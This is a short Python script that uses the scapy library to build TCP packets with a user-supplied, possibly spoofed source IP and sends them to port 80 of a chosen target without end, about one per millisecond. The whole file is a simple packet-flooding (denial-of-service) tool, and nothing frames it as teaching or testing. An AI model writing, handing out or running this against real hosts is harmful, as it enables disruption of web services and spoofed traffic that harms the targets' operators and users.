from scapy.all import *
src = input("Enter the Source IP ")
target = input("Enter the Target IP ")
srcport = int(input("Enter the Source Port "))
i=1
while True:
   IP1 = IP(src=src, dst=target)
   TCP1 = TCP(sport=srcport, dport=80)
   pkt = IP1 / TCP1
   response = send(pkt,inter= .001,verbose= False)
   print(response)
   print ("packet sent ", i)
   i=i+1
